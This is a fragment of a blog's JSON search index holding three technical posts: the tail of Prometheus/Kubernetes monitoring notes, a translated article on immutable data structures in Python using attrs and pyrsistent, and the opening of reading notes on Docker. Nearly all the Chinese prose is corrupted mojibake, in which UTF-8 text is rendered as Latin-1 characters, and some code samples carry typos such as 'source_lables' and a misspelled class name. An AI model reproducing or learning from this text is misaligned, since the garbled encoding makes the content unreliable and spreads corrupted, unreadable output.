Prometheus Serverï¼Œå¯ä»¥è®¾ç½®å¤šç§æœåŠ¡å‘ç°æ–¹å¼ï¼Œå¦‚æœ¬åœ°æ–‡ä»¶æœåŠ¡å‘ç°ã€DNS æœåŠ¡å‘ç°ã€Kubernetes æœåŠ¡å‘ç°ç­‰ã€‚å…·ä½“å¯ä»¥å‚è€ƒå®˜æ–¹é…ç½®æ–‡æ¡£çš„ &lt;*_sd_config&gt; éƒ¨åˆ†ã€‚ Relabeling æœºåˆ¶åœ¨ Prometheus æ‰€æœ‰ Target å®ä¾‹ä¸­ï¼Œä¼šåŒ…å«ä¸€äº›ä»¥åŒä¸‹åˆ’çº¿å¼€å¤´çš„ Metadata æ ‡ç­¾ä¿¡æ¯ï¼Œæ¯”å¦‚ __address__ å’Œ _metrics_path__ ç­‰ã€‚Relabeling æœºåˆ¶å¯ä»¥å°†è¿™äº›æ ‡ç­¾åŠ ä»¥åˆ©ç”¨ï¼Œå¦‚è¿›è¡Œæ ‡ç­¾è¿‡æ»¤ã€æ”¹å˜æ ‡ç­¾åç§°ä»¥ç”¨äºæŸ¥è¯¢ï¼Œæˆ–å¯¹æ ‡ç­¾å€¼è¿›è¡Œ Hash ä»¥å®ŒæˆåŠŸèƒ½åˆ†åŒºç­‰ã€‚å…·ä½“å¯ä»¥çœ‹æ–‡æ¡£ã€‚ ç¬¬ 8 ç« ï¼šç›‘æ§ Kubernetes Kuberenetes ç›‘æ§æŒ‡æ ‡ç›‘æ§ Kubernetes å¹³å°åŠåº”ç”¨æ—¶ï¼Œåœ¨ç™½ç›’å±‚é¢éœ€è¦å…³æ³¨ï¼šåŸºç¡€è®¾æ–½å±‚ï¼ˆNodeï¼‰å®¹å™¨åŸºç¡€è®¾æ–½ï¼ˆContainerï¼‰ç”¨æˆ·åº”ç”¨ï¼ˆPodï¼‰Kubernetes ç»„ä»¶åœ¨é»‘ç›’å±‚é¢éœ€è¦å…³æ³¨ï¼šå†…éƒ¨æœåŠ¡è´Ÿè½½å‡è¡¡ï¼ˆServiceï¼‰å¤–éƒ¨è®¿é—®å…¥å£ï¼ˆIngressï¼‰ åœ¨é›†ç¾¤ä¸­éƒ¨ç½² Prometheus ç›‘æ§ æ ¸å¿ƒç»„ä»¶éƒ¨ç½²éƒ¨ç½² Prometheus Server æ—¶éœ€è¦ä½¿ç”¨ ConfigMap å®šä¹‰é…ç½®æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ Deployment è¿›è¡Œéƒ¨ç½²ã€‚Prometheus åœ¨ k8s é›†ç¾¤å†…çš„æœåŠ¡å‘ç°æ–¹å¼æ˜¯é€šè¿‡ä¸ Kubernetes API é›†æˆï¼Œç›®å‰æ”¯æŒ 5 ç§æœåŠ¡å‘ç°æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯ Node, Service, Pod, Endpoint, Ingress.æ­¤å¤–ï¼ŒCoreOS æä¾›äº† Prometheus Operatorï¼Œå¯ä»¥æ›´åŠ ä¾¿æ·çš„åœ¨ k8s é›†ç¾¤ä¸­éƒ¨ç½²åŠé…ç½® Prometheus. Exporter éƒ¨ç½²Kubernetes å†…ç½®äº† cAdvisor çš„æ”¯æŒï¼Œæ‰€ä»¥ Prometheus å¯ä»¥ç›´æ¥é€šè¿‡ cAdvisor è·å–å®¹å™¨æŒ‡æ ‡ï¼›å¯ä»¥é€šè¿‡ DaemonSet éƒ¨ç½² NodeExporter ä»¥è·å–æ¯ä¸ª Node çš„è¿è¡ŒçŠ¶æ€ï¼Œæ³¨æ„ä¸æ˜¯ Deploymentå¯ä»¥é€šè¿‡éƒ¨ç½² Blackbox Exporter æ¥ç›‘æ§ Service å’Œ Ingress è‡ªå®šä¹‰ Pod æŒ‡æ ‡æŠ“å–åœ¨ç”¨æˆ·éƒ¨ç½² Pod / Deployment / DaemonSet æ—¶ï¼Œå¦‚æœéœ€è¦ Prometheus è¿›è¡Œæ ·æœ¬æŠ“å–ï¼Œéœ€è¦åœ¨ Pod Template çš„ metadata.annotations é‡Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š123prometheus.io/scrape: 'true'prometheus.io/port: '9100'prometheus.io/path: 'metrics'ä¸ºäº†æ”¯æŒ Pod å†…æŒ‡æ ‡è·å–ï¼Œåœ¨é…ç½® Prometheus æ—¶ï¼Œéœ€è¦è¿›è¡Œ Relabel é…ç½®ï¼Œä»¥è¿‡æ»¤æ‰ä¸æ”¯æŒæ ·æœ¬è·å–çš„ Podï¼š123- source_lables: [__meta_kubernetes_pod_annotation_prometheus_io_scrape] action: keep regex: trueè¿™æ¬¡æ ¹æ®æ•´ç†çš„å†…å®¹åˆ¶ä½œäº†ä¸€ä»½æ€ç»´å¯¼å›¾ï¼Œå¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹ã€‚","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"è¯»ä¹¦","slug":"è¯»ä¹¦","permalink":"https://blog.stdioa.com/tags/è¯»ä¹¦/"},{"name":"Prometheus","slug":"Prometheus","permalink":"https://blog.stdioa.com/tags/Prometheus/"}]},{"title":"Python å‡½æ•°å¼ç¼–ç¨‹ï¼šä¸å¯å˜æ•°æ®ç»“æ„","slug":"translation-python-functional-programming","date":"2018-11-11T15:07:00.000Z","updated":"2018-11-14T00:18:59.045Z","comments":true,"path":"2018/11/translation-python-functional-programming/","link":"","permalink":"https://blog.stdioa.com/2018/11/translation-python-functional-programming/","excerpt":"æœ¬æ–‡åŸè½½äº opensource.comï¼Œç”±æœ¬äººç¿»è¯‘ï¼Œç¿»è¯‘ä½œå“åŸè½½äº linux.cnã€‚ç¿»è¯‘åŠè½¬è½½åŸºäº CC-BY-NC-SA åè®®ã€‚å…·ä½“åˆ›ä½œå‚ä¸ä¿¡æ¯å¯è§æ–‡ç« æœ€åéƒ¨åˆ†ã€‚","text":"æœ¬æ–‡åŸè½½äº opensource.comï¼Œç”±æœ¬äººç¿»è¯‘ï¼Œç¿»è¯‘ä½œå“åŸè½½äº linux.cnã€‚ç¿»è¯‘åŠè½¬è½½åŸºäº CC-BY-NC-SA åè®®ã€‚å…·ä½“åˆ›ä½œå‚ä¸ä¿¡æ¯å¯è§æ–‡ç« æœ€åéƒ¨åˆ†ã€‚ä¸å¯å˜æ€§å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ°ç†è§£æˆ‘ä»¬çš„ä»£ç ã€‚ä¸‹é¢æˆ‘å°†è®²è¿°å¦‚ä½•åœ¨ä¸ç‰ºç‰²æ€§èƒ½çš„æ¡ä»¶ä¸‹æ¥å®ç°å®ƒã€‚åœ¨è¿™ä¸ªç”±ä¸¤ç¯‡æ–‡ç« æ„æˆçš„ç³»åˆ—ä¸­ï¼Œæˆ‘å°†è®¨è®ºå¦‚ä½•å°†å‡½æ•°å¼ç¼–ç¨‹æ–¹æ³•è®ºä¸­çš„æ€æƒ³å¼•å…¥è‡³ Python ä¸­ï¼Œæ¥å……åˆ†å‘æŒ¥è¿™ä¸¤ä¸ªé¢†åŸŸçš„ä¼˜åŠ¿ã€‚æœ¬æ–‡ï¼ˆä¹Ÿå°±æ˜¯ç¬¬ä¸€ç¯‡æ–‡ç« ï¼‰ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨ä¸å¯å˜æ•°æ®ç»“æ„çš„ä¼˜åŠ¿ã€‚ç¬¬äºŒéƒ¨åˆ†ä¼šæ¢è®¨å¦‚ä½•åœ¨ toolz åº“çš„å¸®åŠ©ä¸‹ï¼Œç”¨ Python å®ç°é«˜å±‚æ¬¡çš„å‡½æ•°å¼ç¼–ç¨‹ç†å¿µã€‚ä¸ºä»€ä¹ˆè¦ç”¨å‡½æ•°å¼ç¼–ç¨‹ï¼Ÿå› ä¸ºå˜åŒ–çš„ä¸œè¥¿æ›´éš¾æ¨ç†ã€‚å¦‚æœä½ å·²ç»ç¡®ä¿¡å˜åŒ–ä¼šå¸¦æ¥éº»çƒ¦ï¼Œé‚£å¾ˆæ£’ã€‚å¦‚æœä½ è¿˜æ²¡æœ‰è¢«è¯´æœï¼Œåœ¨æ–‡ç« ç»“æŸæ—¶ï¼Œä½ ä¼šæ˜ç™½è¿™ä¸€ç‚¹çš„ã€‚æˆ‘ä»¬ä»æ€è€ƒæ­£æ–¹å½¢å’ŒçŸ©å½¢å¼€å§‹ã€‚å¦‚æœæˆ‘ä»¬æŠ›å¼€å®ç°ç»†èŠ‚ï¼Œå•ä»æ¥å£çš„è§’åº¦è€ƒè™‘ï¼Œæ­£æ–¹å½¢æ˜¯çŸ©å½¢çš„å­ç±»å—ï¼Ÿå­ç±»çš„å®šä¹‰åŸºäºé‡Œæ°æ›¿æ¢åŸåˆ™ã€‚ä¸€ä¸ªå­ç±»å¿…é¡»èƒ½å¤Ÿå®Œæˆè¶…ç±»æ‰€åšçš„ä¸€åˆ‡ã€‚å¦‚ä½•ä¸ºçŸ©å½¢å®šä¹‰æ¥å£ï¼Ÿ123456789from zope.interface import Interfaceclass IRectangle(Interface): def get_length(self): &quot;&quot;&quot;æ­£æ–¹å½¢èƒ½åšåˆ°&quot;&quot;&quot; def get_width(self): &quot;&quot;&quot;æ­£æ–¹å½¢èƒ½åšåˆ°&quot;&quot;&quot; def set_dimensions(self, length, width): &quot;&quot;&quot;å•Šå“¦&quot;&quot;&quot;å¦‚æœæˆ‘ä»¬è¿™ä¹ˆå®šä¹‰ï¼Œé‚£æ­£æ–¹å½¢å°±ä¸èƒ½æˆä¸ºçŸ©å½¢çš„å­ç±»ï¼šå¦‚æœé•¿åº¦å’Œå®½åº¦ä¸ç­‰ï¼Œå®ƒå°±æ— æ³•å¯¹ set_dimensions æ–¹æ³•åšå‡ºå“åº”ã€‚å¦ä¸€ç§æ–¹æ³•ï¼Œæ˜¯é€‰æ‹©å°†çŸ©å½¢åšæˆä¸å¯å˜å¯¹è±¡ã€‚1234567class IRectangle(Interface): def get_length(self): &quot;&quot;&quot;æ­£æ–¹å½¢èƒ½åšåˆ°&quot;&quot;&quot; def get_width(self): &quot;&quot;&quot;æ­£æ–¹å½¢èƒ½åšåˆ°&quot;&quot;&quot; def with_dimensions(self, length, width): &quot;&quot;&quot;è¿”å›ä¸€ä¸ªæ–°çŸ©å½¢&quot;&quot;&quot;ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ­£æ–¹å½¢è§†ä¸ºçŸ©å½¢äº†ã€‚åœ¨è°ƒç”¨ with_dimensions æ—¶ï¼Œå®ƒå¯ä»¥è¿”å›ä¸€ä¸ªæ–°çš„çŸ©å½¢ï¼ˆå®ƒä¸ä¸€å®šæ˜¯ä¸ªæ­£æ–¹å½¢ï¼‰ï¼Œä½†å®ƒæœ¬èº«å¹¶æ²¡æœ‰å˜ï¼Œä¾ç„¶æ˜¯ä¸€ä¸ªæ­£æ–¹å½¢ã€‚è¿™ä¼¼ä¹åƒæ˜¯ä¸ªå­¦æœ¯é—®é¢˜ â€”â€” ç›´åˆ°æˆ‘ä»¬è®¤ä¸ºæ­£æ–¹å½¢å’ŒçŸ©å½¢å¯ä»¥åœ¨æŸç§æ„ä¹‰ä¸Šçœ‹åšä¸€ä¸ªå®¹å™¨çš„ä¾§é¢ã€‚åœ¨ç†è§£äº†è¿™ä¸ªä¾‹å­ä»¥åï¼Œæˆ‘ä»¬ä¼šå¤„ç†æ›´ä¼ ç»Ÿçš„å®¹å™¨ï¼Œä»¥è§£å†³æ›´ç°å®çš„æ¡ˆä¾‹ã€‚æ¯”å¦‚ï¼Œè€ƒè™‘ä¸€ä¸‹éšæœºå­˜å–æ•°ç»„ã€‚æˆ‘ä»¬ç°åœ¨æœ‰ ISquare å’Œ IRectangleï¼Œè€Œä¸” ISquare æ˜¯ IRectangle çš„å­ç±»ã€‚æˆ‘ä»¬å¸Œæœ›æŠŠçŸ©å½¢æ”¾è¿›éšæœºå­˜å–æ•°ç»„ä¸­ï¼š12345class IArrayOfRectangles(Interface): def get_element(self, i): &quot;&quot;&quot;è¿”å›ä¸€ä¸ªçŸ©å½¢&quot;&quot;&quot; def set_element(self, i, rectangle): &quot;&quot;&quot;&apos;rectangle&apos; å¯ä»¥æ˜¯ä»»æ„ IRectangle å¯¹è±¡&quot;&quot;&quot;æˆ‘ä»¬åŒæ ·å¸Œæœ›æŠŠæ­£æ–¹å½¢æ”¾è¿›éšæœºå­˜å–æ•°ç»„ï¼š12345class IArrayOfSquare(Interface): def get_element(self, i): &quot;&quot;&quot;è¿”å›ä¸€ä¸ªæ­£æ–¹å½¢&quot;&quot;&quot; def set_element(self, i, square): &quot;&quot;&quot;&apos;square&apos; å¯ä»¥æ˜¯ä»»æ„ ISquare å¯¹è±¡&quot;&quot;&quot;å°½ç®¡ ISquare æ˜¯ IRectangle çš„å­é›†ï¼Œä½†æ²¡æœ‰ä»»ä½•ä¸€ä¸ªæ•°ç»„å¯ä»¥åŒæ—¶å®ç° IArrayOfSquare å’Œ IArrayOfRectangle.ä¸ºä»€ä¹ˆä¸èƒ½å‘¢ï¼Ÿå‡è®¾ bucket å®ç°äº†è¿™ä¸¤ä¸ªç±»çš„åŠŸèƒ½ã€‚1234567&gt;&gt;&gt; rectangle = make_rectangle(3, 4)&gt;&gt;&gt; bucket.set_element(0, rectangle) # è¿™æ˜¯ IArrayOfRectangle ä¸­çš„åˆæ³•æ“ä½œ&gt;&gt;&gt; thing = bucket.get_element(0) # IArrayOfSquare è¦æ±‚ thing å¿…é¡»æ˜¯ä¸€ä¸ªæ­£æ–¹å½¢&gt;&gt;&gt; assert thing.height == thing.widthTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AssertionErroræ— æ³•åŒæ—¶å®ç°è¿™ä¸¤ç±»åŠŸèƒ½ï¼Œæ„å‘³ç€è¿™ä¸¤ä¸ªç±»æ— æ³•æ„æˆç»§æ‰¿å…³ç³»ï¼Œå³ä½¿ ISquare æ˜¯ IRectangle çš„å­ç±»ã€‚é—®é¢˜æ¥è‡ª set_element æ–¹æ³•ï¼šå¦‚æœæˆ‘ä»¬å®ç°ä¸€ä¸ªåªè¯»çš„æ•°ç»„ï¼Œé‚£ IArrayOfSquare å°±å¯ä»¥æ˜¯ IArrayOfRectangle çš„å­ç±»äº†ã€‚åœ¨å¯å˜çš„ IRectangle å’Œå¯å˜çš„ IArrayOf* æ¥å£ä¸­ï¼Œå¯å˜æ€§éƒ½ä¼šä½¿å¾—å¯¹ç±»å‹å’Œå­ç±»çš„æ€è€ƒå˜å¾—æ›´åŠ å›°éš¾ â€”â€” æ”¾å¼ƒå˜æ¢çš„èƒ½åŠ›ï¼Œæ„å‘³ç€æˆ‘ä»¬çš„ç›´è§‰æ‰€å¸Œæœ›çš„ç±»å‹é—´å…³ç³»èƒ½å¤Ÿæˆç«‹äº†ã€‚å¯å˜æ€§è¿˜ä¼šå¸¦æ¥ä½œç”¨åŸŸæ–¹é¢çš„å½±å“ã€‚å½“ä¸€ä¸ªå…±äº«å¯¹è±¡è¢«ä¸¤ä¸ªåœ°æ–¹çš„ä»£ç æ”¹å˜æ—¶ï¼Œè¿™ç§é—®é¢˜å°±ä¼šå‘ç”Ÿã€‚ä¸€ä¸ªç»å…¸çš„ä¾‹å­æ˜¯ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ”¹å˜ä¸€ä¸ªå…±äº«å˜é‡ã€‚ä¸è¿‡åœ¨å•çº¿ç¨‹ç¨‹åºä¸­ï¼Œå³ä½¿åœ¨ä¸¤ä¸ªç›¸è·å¾ˆè¿œçš„åœ°æ–¹å…±äº«ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿæ˜¯ä¸€ä»¶ç®€å•çš„äº‹æƒ…ã€‚ä» Python è¯­è¨€çš„è§’åº¦æ¥æ€è€ƒï¼Œå¤§å¤šæ•°å¯¹è±¡éƒ½å¯ä»¥ä»å¾ˆå¤šä½ç½®æ¥è®¿é—®ï¼šæ¯”å¦‚åœ¨æ¨¡å—å…¨å±€å˜é‡ï¼Œæˆ–åœ¨ä¸€ä¸ªå †æ ˆè·Ÿè¸ªä¸­ï¼Œæˆ–è€…ä»¥ç±»å±æ€§æ¥è®¿é—®ã€‚å¦‚æœæˆ‘ä»¬æ— æ³•å¯¹å…±äº«åšå‡ºçº¦æŸï¼Œé‚£æˆ‘ä»¬å¯èƒ½è¦è€ƒè™‘å¯¹å¯å˜æ€§æ¥è¿›è¡Œçº¦æŸäº†ã€‚è¿™æ˜¯ä¸€ä¸ªä¸å¯å˜çš„çŸ©å½¢ï¼Œå®ƒåˆ©ç”¨äº† attr åº“ï¼š1234567@attr.s(frozen=True)class Rectange(object): length = attr.ib() width = attr.ib() @classmethod def with_dimensions(cls, length, width): return cls(length, width)è¿™æ˜¯ä¸€ä¸ªæ­£æ–¹å½¢ï¼š123456@attr.s(frozen=True)class Square(object): side = attr.ib() @classmethod def with_dimensions(cls, length, width): return Rectangle(length, width)ä½¿ç”¨ frozen å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“åœ°ä½¿ attrs åˆ›å»ºçš„ç±»æˆä¸ºä¸å¯å˜ç±»å‹ã€‚æ­£ç¡®å®ç° __setitem__ æ–¹æ³•çš„å·¥ä½œéƒ½äº¤ç»™åˆ«äººå®Œæˆäº†ï¼Œå¯¹æˆ‘ä»¬æ˜¯ä¸å¯è§çš„ã€‚ä¿®æ”¹å¯¹è±¡ä»ç„¶å¾ˆå®¹æ˜“ï¼›ä½†æ˜¯æˆ‘ä»¬ä¸å¯èƒ½æ”¹å˜å®ƒçš„æœ¬è´¨ã€‚12too_long = Rectangle(100, 4)reasonable = attr.evolve(too_long, length=10)Pyrsistent èƒ½è®©æˆ‘ä»¬æ‹¥æœ‰ä¸å¯å˜çš„å®¹å™¨ã€‚1234# ç”±æ•´æ•°æ„æˆçš„å‘é‡a = pyrsistent.v(1, 2, 3)# å¹¶éç”±æ•´æ•°æ„æˆçš„å‘é‡b = a.set(1, &quot;hello&quot;)å°½ç®¡ b ä¸æ˜¯ä¸€ä¸ªç”±æ•´æ•°æ„æˆçš„å‘é‡ï¼Œä½†æ²¡æœ‰ä»€ä¹ˆèƒ½å¤Ÿæ”¹å˜ a åªç”±æ•´æ•°æ„æˆçš„æ€§è´¨ã€‚å¦‚æœ a æœ‰ä¸€ç™¾ä¸‡ä¸ªå…ƒç´ å‘¢ï¼Ÿb ä¼šå°†å…¶ä¸­çš„ 999999 ä¸ªå…ƒç´ å¤åˆ¶ä¸€éå—ï¼ŸPyrsistent å…·æœ‰â€œå¤§ Oâ€æ€§èƒ½ä¿è¯ï¼šæ‰€æœ‰æ“ä½œçš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O(log n). å®ƒè¿˜å¸¦æœ‰ä¸€ä¸ªå¯é€‰çš„ C è¯­è¨€æ‰©å±•ï¼Œä»¥åœ¨â€œå¤§ Oâ€æ€§èƒ½ä¹‹ä¸Šè¿›è¡Œæå‡ã€‚ä¿®æ”¹åµŒå¥—å¯¹è±¡æ—¶ï¼Œä¼šæ¶‰åŠåˆ°â€œå˜æ¢å™¨â€çš„æ¦‚å¿µï¼š12345678910blog = pyrsistent.m( title=&quot;My blog&quot;, links=pyrsistent.v(&quot;github&quot;, &quot;twitter&quot;), posts=pyrsistent.v( pyrsistent.m(title=&quot;no updates&quot;, content=&quot;I&apos;m busy&quot;), pyrsistent.m(title=&quot;still no updates&quot;, content=&quot;still busy&quot;)))new_blog = blog.transform([&quot;posts&quot;, 1, &quot;content&quot;], &quot;pretty busy&quot;)new_blog ç°åœ¨å°†æ˜¯å¦‚ä¸‹å¯¹è±¡çš„ä¸å¯å˜ç­‰ä»·ç‰©ï¼š123456&#123;&apos;links&apos;: [&apos;github&apos;, &apos;twitter&apos;], &apos;posts&apos;: [&#123;&apos;content&apos;: &quot;I&apos;m busy&quot;, &apos;title&apos;: &apos;no updates&apos;&#125;, &#123;&apos;content&apos;: &apos;pretty busy&apos;, &apos;title&apos;: &apos;still no updates&apos;&#125;], &apos;title&apos;: &apos;My blog&apos;&#125;ä¸è¿‡ blog ä¾ç„¶ä¸å˜ã€‚è¿™æ„å‘³ç€ä»»ä½•æ‹¥æœ‰æ—§å¯¹è±¡å¼•ç”¨çš„äººéƒ½æ²¡æœ‰å—åˆ°å½±å“ï¼šè½¬æ¢åªä¼šæœ‰å±€éƒ¨æ•ˆæœã€‚å½“å…±äº«è¡Œä¸ºçŒ–ç—æ—¶ï¼Œè¿™ä¼šå¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œå‡½æ•°çš„é»˜è®¤å‚æ•°ï¼š123def silly_sum(a, b, extra=v(1, 2)): extra = extra.extend([a, b]) return sum(extra)åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬äº†è§£äº†ä¸ºä»€ä¹ˆä¸å¯å˜æ€§æœ‰åŠ©äºæˆ‘ä»¬æ¥æ€è€ƒæˆ‘ä»¬çš„ä»£ç ï¼Œä»¥åŠå¦‚ä½•åœ¨ä¸å¸¦æ¥è¿‡å¤§æ€§èƒ½è´Ÿæ‹…çš„æ¡ä»¶ä¸‹å®ç°å®ƒã€‚ä¸‹ä¸€ç¯‡ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•å€ŸåŠ©ä¸å¯å˜å¯¹è±¡æ¥å®ç°å¼ºå¤§çš„ç¨‹åºç»“æ„ã€‚via: https://opensource.com/article/18/10/functional-programming-python-immutable-data-structuresä½œè€…ï¼šMoshe Zadkaé€‰é¢˜ï¼šlujun9972è¯‘è€…ï¼šStdioAæ ¡å¯¹ï¼šwxyæœ¬æ–‡ç”± LCTT åŸåˆ›ç¼–è¯‘ï¼ŒLinuxä¸­å›½ è£èª‰æ¨å‡º","categories":[{"name":"ç¿»è¯‘","slug":"ç¿»è¯‘","permalink":"https://blog.stdioa.com/categories/ç¿»è¯‘/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"LCTT","slug":"LCTT","permalink":"https://blog.stdioa.com/tags/LCTT/"}]},{"title":"ã€ŠDocker å®è·µã€‹é˜…è¯»ç¬”è®°","slug":"docker-practice-notes","date":"2018-10-30T13:14:00.000Z","updated":"2018-11-11T10:39:09.526Z","comments":true,"path":"2018/10/docker-practice-notes/","link":"","permalink":"https://blog.stdioa.com/2018/10/docker-practice-notes/","excerpt":"è¿™å‡ å¤©çœ‹äº†ã€ŠDocker å®è·µã€‹ï¼Œå†™äº†ä¸€ç‚¹è‡ªå·±ä¸çŸ¥é“æˆ–è€…æƒ³è®°å½•ä¸‹æ¥çš„å†…å®¹ã€‚è¿™æ˜¯ä¸€ä»½ç¬”è®°ï¼Œä½†ä¸æ˜¯ä¸€ä»½åŸºç¡€æ•™ç¨‹ã€‚","text":"è¿™å‡ å¤©çœ‹äº†ã€ŠDocker å®è·µã€‹ï¼Œå†™äº†ä¸€ç‚¹è‡ªå·±ä¸çŸ¥é“æˆ–è€…æƒ³è®°å½•ä¸‹æ¥çš„å†…å®¹ã€‚è¿™æ˜¯ä¸€ä»½ç¬”è®°ï¼Œä½†ä¸æ˜¯ä¸€ä»½åŸºç¡€æ•™ç¨‹ã€‚ 1. ç¬¬ä¸€éƒ¨åˆ†ï¼šDocker åŸºç¡€ Docker çš„ä¼˜åŠ¿é€šè¿‡å°†ç¯å¢ƒæ‰“åŒ…æˆé•œåƒçš„æ–¹å¼æ¥æ ‡å‡†åŒ–ç³»ç»Ÿç¯å¢ƒï¼Œéœ€è¦ä½¿ç”¨è¿™ä¸ªç¯å¢ƒçš„äººå¯ä»¥ç›´æ¥ä½¿ç”¨é•œåƒï¼Œæ— é¡»é‡å¤´é…ç½®ç¯å¢ƒã€‚æ‰€ä»¥ï¼ŒDocker åœ¨å¾ˆå¤šæƒ…å†µä¸‹å¯ä»¥ä½œä¸ºè™šæ‹Ÿæœºçš„æ›¿ä»£ä½¿ç”¨ã€‚å¯¹ Linux ç”¨æˆ·è€Œè¨€ï¼ŒDocker é•œåƒæ²¡æœ‰ä¾èµ–ï¼Œæ‰€ä»¥éå¸¸é€‚åˆç”¨äºæ‰“åŒ…è½¯ä»¶ã€‚ å…³é”®æ¦‚å¿µï¼šé•œåƒå’Œå®¹å™¨ç®€è€Œè¨€ä¹‹ï¼Œå®¹å™¨è¿è¡Œç€ç”±é•œåƒå®šä¹‰çš„ç³»ç»Ÿï¼Œè€Œé•œåƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œç”±ä¸€ä¸ªæˆ–å¤šä¸ªå±‚åŠ ä¸Šä¸€äº› Docker çš„å…ƒæ•°æ®ç»„æˆã€‚æˆ‘ä»¬å¯ä»¥ä»ä¸€ä¸ªé•œåƒä¸­ç”Ÿæˆå¤šä¸ªå®¹å™¨ï¼Œè¿™äº›å®¹å™¨å®Œå…¨éš”ç¦»ï¼Œå…¶è¡Œä¸ºä¸ä¼šç›¸äº’å½±å“ã€‚ä¸€ä¸ªå·§å¦™çš„ç±»æ¯”ï¼šé•œåƒå’Œå®¹å™¨çš„å…³ç³»ï¼Œå°±ç›¸å½“äºç±»å’Œå¯¹è±¡çš„å…³ç³»ã€‚åˆ›å»º Docker é•œåƒæœ‰å››ç§æ ‡å‡†çš„æ–¹å¼ï¼šDocker run &amp; docker commit: æ‰‹å·¥åˆ›å»ºé•œåƒDockerfileDockerfile åŠé…ç½®ç®¡ç†ï¼ˆconfiguration managementï¼‰å·¥å…·ä»å¤´åˆ›å»ºé•œåƒå¹¶å¯¼å…¥ä¸€ç»„æ–‡ä»¶ï¼ˆFROM scratch &amp; ADD sthï¼‰Docker å®¹å™¨ä¿®æ”¹æ–‡ä»¶æ—¶ä¼šä½¿ç”¨å†™æ—¶å¤åˆ¶ï¼ˆcopy-on-writeï¼‰çš„æ–¹å¼ï¼šå®¹å™¨çš„æœ€é¡¶å±‚æ˜¯ä¸€ä¸ªå¯å†™å±‚ï¼Œå½“å®¹å™¨éœ€è¦ä¿®æ”¹æ–‡ä»¶æ—¶ï¼Œdocker ä¼šå°†è¯¥æ–‡ä»¶ä»ä¸‹é¢çš„åªè¯»å±‚å¤åˆ¶åˆ°å¯å†™å±‚ï¼Œå†åœ¨å¯å†™å±‚å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€‚åœ¨ docker commit æ—¶ï¼Œè¿™ä¸ªå¯å†™å±‚å°†ä¼šå†»ç»“ï¼Œå˜ä¸ºä¸€ä¸ªå…·æœ‰è‡ªèº«æ ‡è¯†ç¬¦çš„åªè¯»å±‚ã€‚ ä½¿ç”¨æŠ€å·§ä»¥å®ˆæŠ¤è¿›ç¨‹æ–¹å¼è¿è¡Œå®¹å™¨ï¼š-d å‚æ•°ä¼šè®©é•œåƒåœ¨åå°è¿è¡Œï¼›--restart å‚æ•°æŒ‡å®šäº†å®¹å™¨é‡å¯çš„æ¡ä»¶ï¼šç­–ç•¥æè¿°noå®¹å™¨é€€å‡ºæ—¶ä¸é‡å¯alwayså®¹å™¨é€€å‡ºæ—¶æ¯æ¬¡éƒ½ä¼šé‡å¯on-failure[:max-retry]åªåœ¨å¤±è´¥æ—¶ï¼ˆè¿”å›é 0 çŠ¶æ€ç ï¼‰æ—¶é‡å¯å¦‚æœæƒ³è¦ç§»åŠ¨ Docker å­˜å‚¨æ•°æ®çš„ä½ç½®ï¼Œåˆ™åœ¨å¯åŠ¨ docker daemon æ—¶ï¼Œä½¿ç”¨ -g å‚æ•°å¹¶æŒ‡å®šæ–°ä½ç½®ï¼›å®ç°å®¹å™¨é—´é€šä¿¡ï¼šåœ¨ docker run æ—¶ä½¿ç”¨ --link &lt;hostport&gt;:&lt;container&gt;:&lt;containerport&gt; å‚æ•°å¯ä»¥å°†å¦å¤–ä¸€ä¸ªå®¹å™¨çš„æŸä¸ªç«¯å£æ˜ å°„åˆ°å½“å‰å®¹å™¨çš„ç«¯å£ä¸­ï¼›å®ç°åŸç†æ˜¯æ›´æ”¹å½“å‰å®¹å™¨çš„ hosts æ–‡ä»¶ï¼›ä½†è¿™ç§æ˜ å°„æ–¹å¼æœ‰ä¸€ä¸ªå‰ææ¡ä»¶ï¼šæ„å»ºé•œåƒæ—¶å¿…é¡»ç”¨ EXPOSE å‘½ä»¤æš´éœ²å®¹å™¨çš„ç«¯å£ã€‚åœ¨çº¿æŸ¥æ‰¾é•œåƒï¼šä½¿ç”¨ docker search åŠŸèƒ½ã€‚ 2. ç¬¬äºŒéƒ¨åˆ†ï¼šDocker ä¸å¼€å‘ ç”¨ Docker ä»£æ›¿è™šæ‹Ÿæœºå¯ä»¥è€ƒè™‘ä½¿ç”¨ Docker æ¥ä»£æ›¿è™šæ‹Ÿæœºï¼Œä½†ç”±äºç¼ºå°‘ systemd ç­‰å·¥å…·ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘ç”¨ supervisord æ‰˜ç®¡æœåŠ¡ã€‚Docker å’Œè™šæ‹Ÿæœºçš„å·®å¼‚ï¼šDocker é¢å‘åº”ç”¨ï¼Œè€Œè™šæ‹Ÿæœºé¢å‘æ“ä½œç³»ç»ŸDocker å®¹å™¨å’Œå…¶å®ƒå®¹å™¨å…±äº«æ“ä½œç³»ç»Ÿï¼Œè€Œæ¯ä¸ªè™šæ‹Ÿæœºç‹¬äº«ä¸€ä¸ªæ“ä½œç³»ç»ŸDocker è¢«è®¾è®¡æˆåªè¿è¡Œä¸€ä¸ªä¸»è¦è¿›ç¨‹ï¼Œè€Œä¸æ˜¯ç®¡ç†å¤šç»„è¿›ç¨‹ æ„å»ºé•œåƒ Dockerfile 